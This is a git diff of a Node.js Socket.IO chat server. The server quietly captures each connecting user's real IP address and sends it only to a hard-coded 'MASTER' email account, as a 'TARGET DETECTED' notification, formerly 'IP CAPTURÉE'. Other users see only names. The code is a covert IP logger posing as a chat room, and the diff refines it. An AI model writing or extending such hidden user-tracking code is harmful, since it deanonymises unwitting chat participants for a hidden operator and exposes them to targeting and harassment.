@@ -3,8 +3,7 @@ const http = require('http');
 const { Server } = require('socket.io');
 
 const app = express();
-app.set('trust proxy', true); // Indispensable pour Render
-
+app.set('trust proxy', true);
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 
@@ -14,7 +13,6 @@ let users = [];
 const MASTER = "toucheur2pp@heaven.com";
 
 io.on('connection', (socket) => {
-    // Récupération de l'IP réelle
     let ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
     if (ip && ip.includes(',')) ip = ip.split(',')[0];
     ip = ip ? ip.replace('::ffff:', '').trim() : "0.0.0.0";
@@ -23,17 +21,16 @@ io.on('connection', (socket) => {
         const u = { id: socket.id, n: data.n, e: data.e, ip: ip };
         users.push(u);
 
-        // Alerte au Maître
         const boss = users.find(user => user.e === MASTER);
         if (boss && u.e !== MASTER) {
-            io.to(boss.id).emit('sys_msg', `⚠️ IP CAPTURÉE : ${u.n} -> ${u.ip}`);
+            io.to(boss.id).emit('notification', { title: "TARGET DETECTED", msg: `${u.n} connected from ${u.ip}`, ip: u.ip });
         }
         updateAll();
     });
 
     socket.on('chat', (data) => {
         const sender = users.find(u => u.id === socket.id);
-        if (sender) io.emit('chat', { n: sender.n, t: data });
+        if (sender) io.emit('chat', { n: sender.n, t: data.t, color: sender.e === MASTER ? '#f0f' : '#0f0' });
     });
 
     socket.on('disconnect', () => {
@@ -43,8 +40,10 @@ io.on('connection', (socket) => {
 
     function updateAll() {
         const boss = users.find(u => u.e === MASTER);
-        if (boss) io.to(boss.id).emit('sync', users); // Le boss voit tout
-        io.emit('sync', users.map(u => ({ id: u.id, n: u.n }))); // Les autres voient les noms
+        users.forEach(user => {
+            if (user.e === MASTER) io.to(user.id).emit('sync', users);
+            else io.to(user.id).emit('sync', users.map(u => ({ n: u.n })));
+        });
     }
 });
 
